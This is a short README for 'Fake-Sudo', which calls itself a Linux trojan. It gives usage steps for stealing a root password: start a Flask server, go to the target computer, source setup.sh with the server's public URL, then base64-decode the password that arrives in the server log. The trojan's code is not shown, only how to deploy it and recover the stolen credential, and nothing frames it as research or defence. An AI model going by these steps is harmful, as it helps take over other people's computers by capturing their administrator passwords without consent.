# Fake-Sudo
A linux trojan
## How to use
1. Make a server<br>`python3 flask.py`
2. Go to the computer you want to steal the root password from
3. Setup the program<br>`chmod a+x setup.sh`<br>`source setup.sh`
4. Enter the public URL for the server you made (NOT 127.0.0.1)<br>`Site (include https:// or http://) <<< [your url]`
5. Once the server log says something, copy the end of the url and decode it<br>`echo [end of url] | base64 -d` That's the root password!
6. That's it!
